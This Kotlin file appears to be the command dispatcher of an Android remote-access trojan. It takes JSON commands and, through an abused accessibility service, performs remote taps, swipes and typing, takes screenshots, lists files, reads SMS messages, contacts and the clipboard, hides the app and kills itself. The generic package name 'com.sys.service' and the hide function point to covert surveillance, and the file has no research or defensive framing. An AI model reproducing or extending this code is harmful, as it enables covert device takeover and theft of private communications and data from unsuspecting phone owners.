package com.sys.service

import android.content.Context
import android.content.Intent
import android.net.Uri
import android.os.VibrationEffect
import android.os.Vibrator
import android.widget.Toast
import org.json.JSONObject

object Exec {
    var svc: AccSvc? = null

    fun handle(ctx: Context, o: JSONObject) {
        val s = svc
        when (o.optString("c")) {
            "tap" -> s?.tap(o.getInt("x").toFloat(), o.getInt("y").toFloat())
            "swipe" -> s?.swipe(o.getInt("x1").toFloat(), o.getInt("y1").toFloat(),
                o.getInt("x2").toFloat(), o.getInt("y2").toFloat(), o.optLong("ms", 250))
            "type" -> s?.type(o.getString("t"))
            "shot" -> s?.oneShot()
            "back" -> s?.global(android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_BACK)
            "home" -> s?.global(android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_HOME)
            "recents" -> s?.global(android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_RECENTS)
            "notif" -> s?.global(android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_NOTIFICATIONS)
            "lock" -> s?.lock()
            "info" -> s?.info()
            "apps" -> s?.apps()
            "files" -> s?.files(o.optString("p", "/sdcard"))
            "sms" -> s?.sms(o.optInt("n", 40))
            "contacts" -> s?.contacts()
            "clip" -> s?.clip()
            "hide" -> s?.hide(o.optBoolean("v", true))
            "url" -> runCatching {
                ctx.startActivity(Intent(Intent.ACTION_VIEW, Uri.parse(o.getString("u")))
                    .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK))
            }
            "vib" -> runCatching {
                ctx.getSystemService(Vibrator::class.java)
                    .vibrate(VibrationEffect.createOneShot(400, 200))
            }
            "toast" -> Toast.makeText(ctx, o.optString("t"), Toast.LENGTH_SHORT).show()
            "kill" -> s?.killSelf()
        }
    }
}
